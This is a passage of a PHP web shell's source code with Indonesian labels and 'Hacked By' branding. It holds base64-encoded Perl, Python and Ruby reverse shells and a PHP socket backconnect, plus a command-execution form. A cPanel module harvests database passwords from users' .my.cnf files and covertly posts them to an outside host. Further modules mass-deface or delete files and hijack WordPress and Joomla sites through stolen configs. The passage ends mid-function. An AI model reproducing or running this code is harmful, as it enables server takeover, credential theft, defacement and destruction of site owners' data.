$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
}
if($_POST['backconnect'] == 'python') {
$becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
$pbcaa=@fopen('bcpyt.py','w');
fwrite($pbcaa,$becaa);
$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
unlink("bcpyt.py");
}
if($_POST['backconnect'] == 'ruby') {
$becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
$pbcaak=@fopen('bcruby.rb','w');
fwrite($pbcaak,$becaak);
$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
unlink("bcruby.rb");
}
if($_POST['backconnect'] == 'php') {
            $ip = $_POST['server'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip , $port , $errno, $errstr );
            if($errno != 0){
              echo "<font color='red'>$errno : $errstr</font>";
            } else if (!$sockfd)  {
              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
            } else {
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: BackConnect Php By Con7ext ::..
                \n{################################################################}\n");
              $dir = shell_exec("pwd");
              $sysinfo = shell_exec("uname -a");
              $time = Shell_exec("time");
              $len = 1337;
              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
              while(!feof($sockfd)){ $cmdPrompt = '[Con7ext]#:> ';
              fputs ($sockfd , $cmdPrompt );
              $command= fgets($sockfd, $len);
              fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
            }
            fclose($sockfd);
            }
          }
		echo "</p></div>";
} elseif($_GET['jancok'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=white><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['jancok'] == 'cmd') {
echo "<center><form method='post'>
	<font style='text-decoration: underline;'>con7ext@".gethostbyname($_SERVER['HTTP_HOST']).": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre><textarea>".exe($_POST['cmd'])."</textarea></pre>";
	}
}
elseif($_GET['jancok'] == 'cpanel') {
@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}
echo '<br><br><style>
textarea {
resize:none;
color:black;
background-color:#ffffff;  
font-size:8pt; color:black;
border:1px solid white ;
border-left: 4px solid white ;
}
input {
color: black;
border:1px dotted white;
}
</style>';
echo '<center>';
$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");
if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align=center><tr><th valign=top  class=style2> COUNT </th><th valign=top > DOMAIN </th><th valign=top class=style2 > USER </th><th valign=top class=style2 > Password </th><th valign=top class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success3));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
}
}
}
echo '</table>';
$total = $dc;
 
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top class=style2 style=width: 139px>".$count++."</td><td valign=top class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top class=style2 style=width: 139px>'.$r."</td><td valign=top class=style2 style=width: 139px>".$password."</td><td valign=top class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                }
            }
            }
echo '</table>';
$total = $dc;
echo '<br><div class=result valign=top class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}
 
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
} elseif($_GET['jancok'] == 'mass') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$path=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$path=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='ngeue.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Rinto AR</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
}elseif($_GET['mass'] == 'title'){
echo "<center><h1>Mass Title Changer</h1>
<form method='post'>
Link Config: <br>
<input type='text' name='linkconf' height='10' style='width: 450px;' placeholder='http://jembod.com/con7ext_symconf/'><br>
<input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
</form></center>";
if($_POST['gass']) {
    echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
GrabUrl($_POST['linkconf'],'wordpress');   
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By con7ext'><br>POST CONTENT: <input type='text' name='content' value='Hacked By con7ext'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Con7ext'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
</form></center>";
}
if($_POST['edittitle']) {
            $title = htmlspecialchars($_POST['title']);
                $id = $_POST['id'];
                $content = $_POST['content'];
                $postname = $_POST['name'];
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        foreach($link as $dir_config) {
                                $config = anucurl($dir_config);
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
                echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
}elseif($_GET['mass'] == 'changer') {
if($_POST['sikat']) {
      echo "<center><h1>Config Reset Password</h1>
    <form method='post'>
    Link Config: <br>
    <textarea name='link' style='width: 450px; height:250px;'>";
    GrabUrl($_POST['linkconfig'],'txt'); 
    echo"</textarea><br>
        User Baru : <input type='text' name='newuser' placeholder='con7ext'> <br><br>
        Password Baru : <input type='text' name='newpasswd' placeholder='con7ext'><br><br>
    <input type='submit' style='width: 450px;' name='masschanger' value='Hajar!!'>
    </form></center>";
  }else {
    echo '<center>
    <h1>Config Reset Password</h1>
    <form method="post">
    </select><br>
    Link Config :<br>
    <input type="text" name="linkconfig" height="10" style="width: 450px;" placeholder="http://jembod.com/con7ext_symconf/"><br>
    <input type="submit" style="width: 450px;" name="sikat" value="Change User!!">
    </form></center>';
  }
  if($_POST['masschanger']) {
    $user = $_POST['newuser'];
    $pass = $_POST['newpasswd'];
    $passx = md5($pass);
    $link = explode("\r\n", $_POST['link']);
    foreach($link as $file_conf) {
      $config = file_get_contents($file_conf);
      if(preg_match("/JConfig|joomla/",$config)) {
        $dbhost = ambilkata($config,"host = '","'");
        $dbuser = ambilkata($config,"user = '","'");
        $dbpass = ambilkata($config,"password = '","'");
        $dbname = ambilkata($config,"db = '","'");
        $dbprefix = ambilkata($config,"dbprefix = '","'");
        $prefix = $dbprefix."users";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result['id'];
        $site = ambilkata($config,"sitename = '","'");
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
        echo "CMS: Joomla<br>";
        if($site == '') {
          echo "Sitename => <font color=red>Error Cok</font><br>";
        } else {
          echo "Sitename => $site<br>";
        }
        if(!$update OR !$conn OR !$db) {
